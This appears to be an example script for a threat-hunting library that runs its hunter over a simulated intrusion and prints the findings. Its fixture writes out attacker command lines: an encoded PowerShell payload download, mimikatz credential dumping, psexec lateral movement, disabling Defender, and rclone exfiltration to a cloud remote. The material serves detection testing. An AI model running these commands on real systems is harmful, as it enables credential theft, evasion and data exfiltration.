"""Example: Autonomous threat hunting.

Demonstrates:
    - Running built-in hunting playbooks
    - Pattern-based hunting
    - Temporal anomaly detection
    - Reviewing hunting findings
"""

import asyncio
from phantom.hunting.hunter import ThreatHunter


# Simulated events from a compromised environment
ATTACK_SCENARIO = [
    # Stage 1: Initial Access — Phishing attachment opens macro
    {"process_name": "cmd.exe", "parent_process": "winword.exe",
     "command_line": "cmd /c powershell -nop -w hidden -enc ZG93bmxvYWQ=",
     "username": "victim", "hostname": "WS-001", "timestamp": 1705312200.0},

    # Stage 2: Execution — Encoded PowerShell download
    {"process_name": "powershell.exe", "parent_process": "cmd.exe",
     "command_line": "powershell -enc ZG93bmxvYWQgaHR0cDovLzEwLjAuMC41MC9wYXlsb2FkLmV4ZQ==",
     "username": "victim", "hostname": "WS-001", "timestamp": 1705312230.0},

    # Stage 3: Discovery — Internal recon
    {"process_name": "net.exe", "command_line": "net user /domain",
     "username": "victim", "hostname": "WS-001", "timestamp": 1705312260.0},
    {"process_name": "whoami.exe", "command_line": "whoami /all",
     "username": "victim", "hostname": "WS-001", "timestamp": 1705312265.0},
    {"process_name": "nltest.exe", "command_line": "nltest /dclist:corp.local",
     "username": "victim", "hostname": "WS-001", "timestamp": 1705312270.0},

    # Stage 4: Credential Access — Dump credentials
    {"process_name": "mimikatz.exe",
     "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
     "username": "victim", "hostname": "WS-001", "timestamp": 1705312300.0},

    # Stage 5: Lateral Movement — Move to DC
    {"process_name": "psexec.exe",
     "command_line": "psexec.exe \\\\DC-01 -u admin -p pass cmd",
     "username": "admin", "hostname": "WS-001", "dst_ip": "10.0.0.10",
     "dst_port": 445, "timestamp": 1705312360.0},

    # Stage 6: Defense Evasion — Disable AV
    {"process_name": "powershell.exe",
     "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true",
     "username": "admin", "hostname": "DC-01", "timestamp": 1705312400.0},

    # Stage 7: Exfiltration prep
    {"process_name": "rclone.exe",
     "command_line": "rclone copy C:\\sensitive mega:exfil",
     "username": "admin", "hostname": "DC-01", "timestamp": 1705312500.0},
]


async def main() -> None:
    hunter = ThreatHunter(use_llm=False)

    print("=" * 70)
    print("  PHANTOM Autonomous Threat Hunting Demo")
    print("=" * 70)
    print(f"\n  Analyzing {len(ATTACK_SCENARIO)} events from simulated attack...\n")

    findings = await hunter.hunt(ATTACK_SCENARIO)

    print(f"  Found {len(findings)} hunting findings:\n")

    for i, finding in enumerate(findings, 1):
        severity_icon = {
            "critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"
        }.get(finding["severity"], "⚪")

        print(f"  {severity_icon} [{i}] {finding['title']}")
        print(f"      Type: {finding['type']}")
        print(f"      Severity: {finding['severity']}")
        print(f"      MITRE: {finding.get('mitre_technique', 'N/A')}")
        print(f"      Events: {finding.get('event_count', 0)}")
        print(f"      Confidence: {finding.get('confidence', 0):.2f}")
        print(f"      Description: {finding['description'][:100]}")
        print()


if __name__ == "__main__":
    asyncio.run(main())
